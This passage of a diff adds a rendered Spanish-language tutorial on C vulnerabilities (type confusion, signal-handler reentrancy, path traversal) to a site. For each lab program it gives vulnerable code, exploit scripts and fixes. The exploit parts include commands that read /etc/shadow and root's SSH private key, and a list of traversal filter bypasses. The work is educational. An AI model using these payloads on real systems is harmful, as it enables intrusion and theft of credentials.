+</span></span><span style="display:flex;"><span>struct<span style="color:#f92672">.</span>pack_into(<span style="color:#e6db74">&#39;&lt;i&#39;</span>, raw, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cmd = &#34;/bin/sh&#34; (offset 8)</span>
+</span></span><span style="display:flex;"><span>raw[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(raw<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enviar este buffer al proceso vulnerable</span>
+</span></span></code></pre></div><h3 id="compilar-6">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_typeconf vuln_typeconf.c -no-pie
+</span></span><span style="display:flex;"><span>./vuln_typeconf   <span style="color:#75715e"># el main ya construye el exploit internamente</span>
+</span></span></code></pre></div><hr>
+<h2 id="14-signal-handler-reentrancy">14. Signal Handler Reentrancy</h2>
+<p><strong>CWE-364</strong> — Medio/Alto</p>
+<h3 id="mecanismo-13">Mecanismo</h3>
+<p>Un signal handler llama a funciones no async-signal-safe (como <code>malloc</code>, <code>printf</code>, <code>free</code>).
+Si la señal interrumpe esa misma función en el hilo principal, hay race condition interna.
+Puede corromper estructuras internas de la libc (ej: el heap).</p>
+<h3 id="código-vulnerable-13">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_signal.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>global_buf <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sigint_handler</span>(<span style="color:#66d9ef">int</span> sig) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 printf y free NO son async-signal-safe
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Señal recibida!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);    <span style="color:#75715e">// corrompe si interrumpe otro printf
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(global_buf);               <span style="color:#75715e">// corrompe si interrumpe malloc/free
+</span></span></span><span style="display:flex;"><span>    global_buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">64</span>);        <span style="color:#75715e">// double-free efectivo si timing es malo
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(global_buf, <span style="color:#e6db74">&#34;reseteado&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">signal</span>(SIGINT, sigint_handler);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        global_buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Si SIGINT llega entre el malloc y el free → double free en handler
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(global_buf, <span style="color:#e6db74">&#34;datos importantes&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Processing: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, global_buf);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(global_buf);
+</span></span><span style="display:flex;"><span>        global_buf <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--timing-de-señal">Exploit — timing de señal</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># exploit_signal.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bombardear el proceso con señales para ganar la race</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PID<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>./vuln_signal &amp;<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>sleep 0.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enviar SIGINT muy rápido para ganar la race</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 1000<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    kill -INT $PID 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wait $PID
+</span></span></code></pre></div><h3 id="fix-correcto">Fix correcto</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Solo estas funciones son async-signal-safe:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// write(), _exit(), signal(), kill(), sem_post()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// NUNCA: printf, malloc, free, exit, fopen en signal handlers
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">sig_atomic_t</span> got_signal <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">safe_handler</span>(<span style="color:#66d9ef">int</span> sig) {
+</span></span><span style="display:flex;"><span>    got_signal <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;   <span style="color:#75715e">// solo setear flag, procesar en el loop principal
+</span></span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="15-path-traversal--directory-traversal">15. Path Traversal / Directory Traversal</h2>
+<p><strong>CWE-22</strong> — Alto</p>
+<h3 id="mecanismo-14">Mecanismo</h3>
+<p>El usuario controla un path de archivo. Si no se sanitiza <code>../</code>, puede acceder fuera del directorio base.
+En programas setuid o servidores web: lee/escribe archivos arbitrarios del sistema.</p>
+<h3 id="código-vulnerable-14">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_traversal.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BASE_DIR &#34;/var/www/files/&#34;
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">serve_file</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> path[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 sin sanitizar &#39;../&#39; en filename
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(path, <span style="color:#66d9ef">sizeof</span>(path), <span style="color:#e6db74">&#34;%s%s&#34;</span>, BASE_DIR, filename);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Sirviendo: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(path, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>f) { <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;fopen&#34;</span>); <span style="color:#66d9ef">return</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgets</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf), f))
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(f);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">serve_file</span>(argv[<span style="color:#ae81ff">1</span>]);   <span style="color:#75715e">// argv[1] controlado por atacante
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-4">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># exploit_traversal.sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leer /etc/passwd</span>
+</span></span><span style="display:flex;"><span>./vuln_traversal <span style="color:#e6db74">&#34;../../etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → /var/www/files/../../etc/passwd = /etc/passwd ✓</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leer /etc/shadow (si setuid root)</span>
+</span></span><span style="display:flex;"><span>./vuln_traversal <span style="color:#e6db74">&#34;../../etc/shadow&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leer clave SSH</span>
+</span></span><span style="display:flex;"><span>./vuln_traversal <span style="color:#e6db74">&#34;../../../root/.ssh/id_rsa&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leer código fuente de la app</span>
+</span></span><span style="display:flex;"><span>./vuln_traversal <span style="color:#e6db74">&#34;../../var/www/html/config.php&#34;</span>
+</span></span></code></pre></div><h3 id="exploit-en-python-con-encoding-bypass">Exploit en Python con encoding bypass</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_traversal.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Algunos filtros bloquean &#39;../&#39; en texto plano</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bypass con encoding alternativo:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>traversals <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;../../etc/passwd&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;..</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">..</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">etc</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">passwd&#34;</span>,          <span style="color:#75715e"># URL encode</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;..</span><span style="color:#e6db74">%252F</span><span style="color:#e6db74">..</span><span style="color:#e6db74">%252F</span><span style="color:#e6db74">etc</span><span style="color:#e6db74">%252F</span><span style="color:#e6db74">passwd&#34;</span>,     <span style="color:#75715e"># doble encode</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;....//....//etc/passwd&#34;</span>,           <span style="color:#75715e"># bypass de replace(&#39;../&#39;, &#39;&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;..</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">..</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">etc</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">passwd&#34;</span>,             <span style="color:#75715e"># Windows style</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%2e%2e%2f%2e%2e%2f</span><span style="color:#e6db74">etc</span><span style="color:#e6db74">%2f</span><span style="color:#e6db74">passwd&#34;</span>,  <span style="color:#75715e"># hex encode</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> traversals:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Probando: </span><span style="color:#e6db74">{</span>t<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># subprocess.run([&#39;./vuln_traversal&#39;, t])</span>
+</span></span></code></pre></div><h3 id="fix-1">Fix</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Verificar con realpath() y que empiece con BASE_DIR
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> resolved[PATH_MAX];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">realpath</span>(path, resolved);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(resolved, BASE_DIR, <span style="color:#a6e22e">strlen</span>(BASE_DIR)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Path inválido&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="resumen--todas-las-vulnerabilidades">Resumen — Todas las vulnerabilidades</h2>
+<table>
+	<thead>
+			<tr>
+					<th>#</th>
+					<th>Nombre</th>
+					<th>CWE</th>
+					<th>Primitiva</th>
+					<th>Impacto típico</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>1</td>
+					<td>Integer Overflow → Heap OF</td>
+					<td>190/122</td>
+					<td>Write OOB en heap</td>
+					<td>Heap corruption, RCE</td>
+			</tr>
+			<tr>
+					<td>2</td>
+					<td>Off-By-One</td>
+					<td>193</td>
+					<td>1 byte fuera del buffer</td>
+					<td>Stack/heap corruption</td>
+			</tr>
+			<tr>
+					<td>3</td>
+					<td>gets()</td>
+					<td>242</td>
+					<td>Write ilimitado en stack</td>
+					<td>Stack BOF clásico</td>
+			</tr>
+			<tr>
+					<td>4</td>
+					<td>Uninitialized Memory</td>
+					<td>457</td>
+					<td>Leer/usar basura del stack/heap</td>
+					<td>Info leak, priv escalation</td>
+			</tr>
+			<tr>
+					<td>5</td>
+					<td>Null Pointer Dereference</td>
+					<td>476</td>
+					<td>Deref de NULL</td>
+					<td>Crash / kernel null page</td>
+			</tr>
+			<tr>
+					<td>6</td>
+					<td>Dangling Pointer</td>
+					<td>825</td>
+					<td>Usar puntero a memoria muerta</td>
+					<td>Info leak, control flow</td>
+			</tr>
+			<tr>
+					<td>7</td>
+					<td>Heap Overflow</td>
+					<td>122</td>
+					<td>Write OOB en heap contiguo</td>
+					<td>Corrupción de objetos</td>
+			</tr>
+			<tr>
+					<td>8</td>
+					<td>Stack Overflow (recursión)</td>
+					<td>674</td>
+					<td>Agotar el stack</td>
+					<td>Crash, signal hijack</td>
+			</tr>
+			<tr>
+					<td>9</td>
+					<td>Race Condition / TOCTOU</td>
+					<td>362/367</td>
+					<td>Ventana entre check y use</td>
+					<td>Privilege escalation</td>
+			</tr>
+			<tr>
+					<td>10</td>
+					<td>Signed/Unsigned Mismatch</td>
+					<td>195</td>
+					<td>Bypass de bounds check</td>
+					<td>BOF, OOB write</td>
+			</tr>
+			<tr>
+					<td>11</td>
+					<td>OOB Read</td>
+					<td>125</td>
+					<td>Leer más allá del buffer</td>
+					<td>Info leak, ASLR bypass</td>
+			</tr>
+			<tr>
+					<td>12</td>
+					<td>Improper String Termination</td>
+					<td>170</td>
+					<td>String sin <code>\0</code></td>
+					<td>Info leak, OOB read</td>
+			</tr>
+			<tr>
+					<td>13</td>
+					<td>Type Confusion</td>
+					<td>843</td>
+					<td>Cast incorrecto entre tipos</td>
+					<td>Objeto falso, RCE</td>
+			</tr>
+			<tr>
+					<td>14</td>
+					<td>Signal Handler Reentrancy</td>
+					<td>364</td>
+					<td>Race en handler</td>
+					<td>Heap corruption, double free</td>
+			</tr>
+			<tr>
+					<td>15</td>
+					<td>Path Traversal</td>
+					<td>22</td>
+					<td><code>../</code> sin sanitizar</td>
+					<td>Lectura/escritura arbitraria</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="herramientas-de-detección">Herramientas de detección</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Análisis estático</span>
+</span></span><span style="display:flex;"><span>cppcheck --enable<span style="color:#f92672">=</span>all vuln.c
+</span></span><span style="display:flex;"><span>clang --analyze vuln.c
+</span></span><span style="display:flex;"><span>semgrep --config<span style="color:#f92672">=</span>p/c vuln.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Análisis dinámico (sanitizers)</span>
+</span></span><span style="display:flex;"><span>gcc -fsanitize<span style="color:#f92672">=</span>address,undefined -o vuln vuln.c      <span style="color:#75715e"># AddressSanitizer + UBSan</span>
+</span></span><span style="display:flex;"><span>gcc -fsanitize<span style="color:#f92672">=</span>memory -o vuln vuln.c                  <span style="color:#75715e"># MemorySanitizer</span>
+</span></span><span style="display:flex;"><span>gcc -fsanitize<span style="color:#f92672">=</span>thread -o vuln vuln.c                  <span style="color:#75715e"># ThreadSanitizer (races)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fuzzing</span>
+</span></span><span style="display:flex;"><span>afl-fuzz -i inputs/ -o findings/ -- ./vuln @@
+</span></span><span style="display:flex;"><span>libFuzzer: clang -fsanitize<span style="color:#f92672">=</span>fuzzer,address -o vuln_fuzz vuln.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Debugging de heap</span>
+</span></span><span style="display:flex;"><span>valgrind --leak-check<span style="color:#f92672">=</span>full --track-origins<span style="color:#f92672">=</span>yes ./vuln
+</span></span></code></pre></div><hr>
+<h2 id="compilación-con-todas-las-protecciones-producción">Compilación con todas las protecciones (producción)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc vuln.c -o binario <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -fstack-protector-strong <span style="color:#ae81ff">\ </span>  <span style="color:#75715e"># stack canary</span>
+</span></span><span style="display:flex;"><span>    -fPIE -pie <span style="color:#ae81ff">\ </span>                <span style="color:#75715e"># PIE (ASLR)</span>
+</span></span><span style="display:flex;"><span>    -D_FORTIFY_SOURCE<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">\ </span>       <span style="color:#75715e"># fortify de funciones de string</span>
+</span></span><span style="display:flex;"><span>    -Wl,-z,relro <span style="color:#ae81ff">\ </span>              <span style="color:#75715e"># GOT de solo lectura (partial RELRO)</span>
+</span></span><span style="display:flex;"><span>    -Wl,-z,now <span style="color:#ae81ff">\ </span>                <span style="color:#75715e"># GOT cargado al inicio (full RELRO)</span>
+</span></span><span style="display:flex;"><span>    -Wl,-z,noexecstack <span style="color:#ae81ff">\ </span>        <span style="color:#75715e"># stack no ejecutable (NX)</span>
+</span></span><span style="display:flex;"><span>    -Wall -Wextra                <span style="color:#75715e"># warnings</span>
+</span></span></code></pre></div><h1 id="vulnerabilidades-en-c-y-sus-exploits">Vulnerabilidades en C y sus Exploits</h1>
 <h2 id="flujo-de-trabajo-para-explotar-cada-vulnerabilidad">Flujo de trabajo para explotar cada vulnerabilidad</h2>
 <hr>
 <h2 id="herramientas-esenciales">Herramientas esenciales</h2>
@@ -291,7 +1363,7 @@ Leer memoria:">
 </table>
 <hr>
 <h2 id="1-buffer-overflow-cwe-121">1. Buffer Overflow (CWE-121)</h2>
-<h3 id="código-vulnerable">Código vulnerable</h3>
+<h3 id="código-vulnerable-15">Código vulnerable</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_bof.c
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
@@ -311,7 +1383,7 @@ Leer memoria:">
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>(argv[<span style="color:#ae81ff">1</span>]);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="exploit-en-python">Exploit en Python</h3>
+</span></span></code></pre></div><h3 id="exploit-en-python-1">Exploit en Python</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_bof.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
@@ -350,7 +1422,7 @@ overflow     [ AAAA...AAAA + \x36\x11\x40\x00... ]  ← sobrescribe RIP
 </ol>
 <hr>
 <h2 id="2-format-string-cwe-134">2. Format String (CWE-134)</h2>
-<h3 id="código-vulnerable-1">Código vulnerable</h3>
+<h3 id="código-vulnerable-16">Código vulnerable</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_fmtstr.c
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span>
@@ -370,7 +1442,7 @@ overflow     [ AAAA...AAAA + \x36\x11\x40\x00... ]  ← sobrescribe RIP
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="exploit-en-python-1">Exploit en Python</h3>
+</span></span></code></pre></div><h3 id="exploit-en-python-2">Exploit en Python</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_fmtstr.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
@@ -414,7 +1486,7 @@ overflow     [ AAAA...AAAA + \x36\x11\x40\x00... ]  ← sobrescribe RIP
 </span></span><span style="display:flex;"><span>pip install pwntools                       <span style="color:#75715e"># librería que facilita todo</span>
 </span></span></code></pre></div><hr>
 <h2 id="3-use-after-free-cwe-416">3. Use-After-Free (CWE-416)</h2>
-<h3 id="código-vulnerable-2">Código vulnerable</h3>
+<h3 id="código-vulnerable-17">Código vulnerable</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_uaf.c
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
@@ -474,7 +1546,7 @@ u-&gt;print  apunta ahora a admin_print()         hijacked
 </code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_uaf vuln_uaf.c <span style="color:#f92672">&amp;&amp;</span> python3 exploit_uaf.py | ./vuln_uaf
 </span></span></code></pre></div><hr>
 <h2 id="4-double-free-cwe-415">4. Double Free (CWE-415)</h2>
-<h3 id="código-vulnerable-3">Código vulnerable</h3>
+<h3 id="código-vulnerable-18">Código vulnerable</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_doublefree.c
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
